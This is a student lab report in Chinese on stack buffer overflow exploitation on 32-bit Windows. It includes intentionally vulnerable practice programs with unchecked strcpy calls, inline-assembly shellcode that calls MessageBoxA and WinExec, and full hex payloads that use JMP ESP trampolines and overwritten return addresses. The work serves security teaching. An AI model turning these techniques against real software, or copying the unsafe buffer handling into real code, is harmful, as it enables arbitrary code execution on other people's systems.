# 2022-10-15-shellcode实验

## 一、目标

1.   了解shellcode注入原理（2.3节&2.3.6 代码注入攻击）

2.   理解给出的弹出对话框的汇编代码

3.   通过淹没静态地址来实现shellcode的代码植入

4.   通过跳板来实现shellcode的代码植入

5.   尝试修改汇编语句的shellcode实现修改标题等简单操作

6.   对StackOverrun构造shellcode，通过JMP ESP的方式实现通过记事本打开shellcode.txt（可使用CreateProcessA或WinExec等API）。

## 二、 测试步骤与结果

### （一） overflow_exe

#### 1. 初步测试

```c++
#include <stdio.h>
#include <windows.h>
#include <string>
#define PASSWORD "1234567"
int verify_password (char *password)
{
	int authenticated;
	char buffer[44];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);//over flowed here!	
	return authenticated;
}
main()
{
	int valid_flag=0;
	char password[1024];
	FILE * fp;
	LoadLibrary("user32.dll");//prepare for messagebox
	if(!(fp=fopen("password.txt","rw+")))
	{
		exit(0);
	}
	fscanf(fp,"%s",password);
	valid_flag = verify_password(password);
	if(valid_flag)
	{
		printf("incorrect password!\n");
	}
	else
	{
		printf("Congratulation! You have passed the verification!\n");
	}
	fclose(fp);
	system("pause");
}
```

用如下命令编译程序：

```sh
g++ .\overflow_exe.cpp -m32 -g -o overflow_exe.exe
```

创建password.txt，写入任意短错误密码，并打开程序，显示错误密码。

![image-20221015183352648](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015183352648.png)

写入正确密码，程序提示通过认证。

![image-20221015183744368](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015183744368.png)

写入长错误密码，程序无输出，短暂延时后退出，既非正确输入提示也非错误输入提示并异常退出，应存在溢出漏洞。

#### 2. 静态分析

主函数**加载user32.dll模块**，读取password.txt并将其中密码传入verify_password函数。检测其返回值为0则正确，不为0则错误。

![image-20221015184005815](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221015184005815.png)

verify_password函数将密码与1234567比较返回值作为函数返回值，拷贝password到buffer中，此处可能导致溢出。

![image-20221016100903357](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016100903357.png)

#### 3. 动态分析

##### （1）跳板实现

开启动态调试，快捷键`A-b`检索0xe4ff，得到其中一个的地址为767AF237。**FF E4是JMP ESP的机器码，但在内存中是小端存储的，因此要检索内存中的E4 FF**。

![image-20221016135959017](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016135959017.png)

![image-20221016140524485](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140524485.png)

在Modules中查找user32.dll，双击后查找MessageBoxA，得到地址768082D0。

![image-20221016110426869](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016110426869.png)

在Modules中查找KERNEL32.dll，双击后查找kernel32_ExitProcessh函数，得到地址75B76850。

![image-20221016111216319](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016111216319.png)

构造shellcode，加载user32.dll库，内联汇编调用MessageBoxA函数（地址768082D0）弹出对话框，标题和内容都是buptbupt，调用ExitProcess函数（地址75B76850）结束程序，在**VC6中编译（如下写法不能在gcc中编译，gcc使用AT&T语法）**。

```c
// shellcode.cpp
#include<windows.h>
int main()
{
	HINSTANCE LibHandle;
	char dllbuf[11] = "user32.dll";
	LibHandle = LoadLibrary(dllbuf);
	_asm{
		sub sp,0x440
		xor ebx,ebx
		push ebx
		push 0x74707562		//bupt
		push 0x74707562		//bupt
		mov eax,esp
		push ebx
		push eax
		push eax
		push ebx
		mov eax,0x768082D0	//messageboxA
		call eax
		push ebx
		mov eax,0x75B76850	//exitprocess
		call eax
	}
	return 0;
}
```

将编译好的文件拷贝到宿主机，运行如下。

![image-20221016113209314](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016113209314.png)

载入IDA，查看汇编代码，在hax-view中复制对应十六进制数据。

![image-20221016113501339](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016113501339.png)

得到shellcode：`66 81 EC 40 04 33 DB 53 68 62 75 70 74 68 62 75 70 74 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF D0`。

进入verify_password函数之后，esp所指为该函数返回值。

![image-20221016120607540](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016120607540.png)

ebp压栈，epb移动，拓展48h(72d)B栈空间，存入真密码地址，存入输入密码地址，调用strcmp函数，此时栈空间如下所示，从上到下依次为：下一函数参数1地址4B，下一函数参数2地址4B，未知8B，Buffer44B，authenticated4B，未知4B，verify_password函数参数password地址4B，EBP4B，函数返回地址4B。

![image-20221016133629195](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016133629195.png)

随后调用strcpy函数类似，最终函数return前栈空间布局无变化。

![image-20221016124654106](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016124654106.png)

构造payload，44+4+4+4+4=60B 任意数据 + 4B JMP ESP地址 + 39B shellcode。

```
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 37 F2 7A 76 66 81 EC 40 04 33 DB 53 68 62 75 70 74 68 62 75 70 74 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF 90 90 90 90 90 90 90 90 90 90
```

![image-20221016211402741](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016211402741.png)

重新运行程序，执行到ret指令是，看到返回地址被替换为jmp esp的地址，执行。

![](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140617698.png)

EIP指向jmp esp，esp为0061FAA0，继续执行。

![image-20221016140914765](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016140914765.png)

IDA解析了插入的shellcode并开始执行shellcode。

![image-20221016141043443](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016141043443.png)

按预期出现弹窗，随后程序执行完毕。

![image-20221016141144530](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016141144530.png)

##### （2）淹没静态地址实现

使用绝对地址时栈空间以00开头，因此返回地址后的数据不会被拷贝，strcpy函数在拷贝到F8FA6100处后截断字符串，因此将返回地址定为拷贝前的字符串中shellcode的地址。

![image-20221016143817468](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016143817468.png)

根据上图，shellcode起始地址为0061FAF8。构造payload，44+4+4+4+4=60B 任意数据 + 4B shellcode起始地址 + 39B shellcode。将buptbupt改为Buptbup7。

```
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 F8 FA 61 00 66 81 EC 40 04 33 DB 53 68 42 75 70 74 68 62 75 70 37 8B C4 53 50 50 53 B8 D0 82 80 76 FF D0 53 B8 50 68 B7 75 FF 90 90 90 90 90 90 90 90 90 90
```

![image-20221016143920192](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016143920192.png)

运行程序到ret，程序返回地址被覆盖为shellcode起始地址。

![image-20221016144332724](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016144332724.png)

按预期弹窗，随后程序执行完毕。

![image-20221016144428144](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016144428144.png)



### （二）StackOverrun

```c++
// StackOverrun.cpp
/*
  StackOverrun.c
  This program shows an example of how a stack-based 
  buffer overrun can be used to execute arbitrary code.  Its 
  objective is to find an input string that executes the function bar.
*/
#include <stdio.h>
#include <windows.h>
#include <string.h>
void foo(const char* input)
{
    char buf[10];
    LoadLibrary("user32.dll");//prepare for messagebox
    //What? No extra arguments supplied to printf?
    //It's a cheap trick to view the stack 8-)
    //We'll see this trick again when we look at format strings.
    printf("My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n");

    //Pass the user input straight to secure code public enemy #1.
    strcpy(buf, input);
    printf("%s\n", buf);

    printf("Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n");
}
void bar(void)
{
    printf("Augh! I've been hacked!\n");
}
int main(int argc, char* argv[])
{
    //Blatant cheating to make life easier on myself
    printf("Address of foo = %p\n", foo);
    printf("Address of bar = %p\n", bar);
   
foo(argv[1]);
    return 0;
}
// g++ StackOverrun.cpp -m32 -g -o StackOverrun.exe
```



在ida中查询jmp esp的地址。

![image-20221016214244011](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016214244011.png)

在ida中查询WinExec的地址为0x760A4620。

![image-20221016233657503](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016233657503.png)

```c
// shellcode.cpp
#include<windows.h>
int main()
{
	HINSTANCE LibHandle;
	char dllbuf[11] = "kernel32.dll";
	LibHandle = LoadLibrary(dllbuf);
	_asm{
        push 0x00000074
        push 0x78742E65
        push 0x646F636C
        push 0x6C656873
        push 0x20646170
        push 0x65746F6E
        mov esi,esp
        push 5
        push esi
        mov eax,0x760A4620
        call eax
	}
	return 0;
}
```

代码对应00401062-00401088，**下图中的地址有所变化**。

![image-20221016210350253](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016210350253.png)

对应十六进制表示：

```
6A 74 68 65 2E 74 78 68 6C 63 6F 64 68 73 68 65 6C 68 70 61 64 20 68 6E 6F 74 65 8B F4 6A 05 56 B8 20 46 0A 76 FF D0
```

构造shellcode，12B 任意数据 + 4B jmp esp地址 + 39B 机器码：

```
30 30 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 07 F2 FE 76 6A 74 68 65 2E 74 78 68 6C 63 6F 64 68 73 68 65 6C 68 70 61 64 20 68 6E 6F 74 65 8B F4 6A 05 56 B8 20 46 0A 76 FF D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
```

![image-20221017005653366](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221017005653366.png)

在ida中粘贴为调用参数：

![image-20221016211902750](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016211902750.png)

运行至返回：

![image-20221016212117206](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016212117206.png)

进入jmp esp。

![image-20221016231522224](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016231522224.png)

发现复制的字符串在ida中的二进制被强制修改，经多次多种工具尝试未果，决定修改代码，将参数从文件传入，该修改不影响shellcode执行流程。

![image-20221016231542134](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221016231542134.png)

```c++
// StackOverrun.cpp
#include <stdio.h>
#include <windows.h>
#include <string.h>

void foo(const char* input)
{
    char buf[10];

    LoadLibrary("user32.dll");
    printf("My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n");
    strcpy(buf, input);
    printf("%s\n", buf);
    printf("Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n");
}
void bar(void)
{
    printf("Augh! I've been hacked!\n");
}
int main(int argc, char* argv[])
{
	FILE * fp; // 声明文件指针
    printf("Address of foo = %p\n", foo);
    printf("Address of bar = %p\n", bar);
	char arg[1024];
	if(!(fp=fopen("arg.txt","rw+"))){
		exit(0); // 判断是否正常打开文件
	}
	fread(arg,sizeof(char),1024,fp); //读入文件内容
	foo(arg); // 调用函数foo
    return 0;
}
// g++ StackOverrun.cpp -m32 -g -o StackOverrun.exe
```

**文件读入时要使用fread函数，shellcode中存在的0x0A是换行符fgets函数将截断字符串，存在的0x20是空格fscanf函数将截断字符串。**

运行程序至返回，进入跳转指令。

![image-20221017005202918](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221017005202918.png)

jmp esp。

![image-20221017005223063](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221017005223063.png)

IDA解析出栈上的shellcode，将notepad shellcode.txt（小端存储）压入栈，保存首地址于esi，压入第一个参数5（SW_SHOW），压入字符串地址，调用WinExec函数，成功弹窗，读取shellcode.txt。

![image-20221017005257570](2022-10-15-shellcode%E5%AE%9E%E9%AA%8C/image-20221017005257570.png)
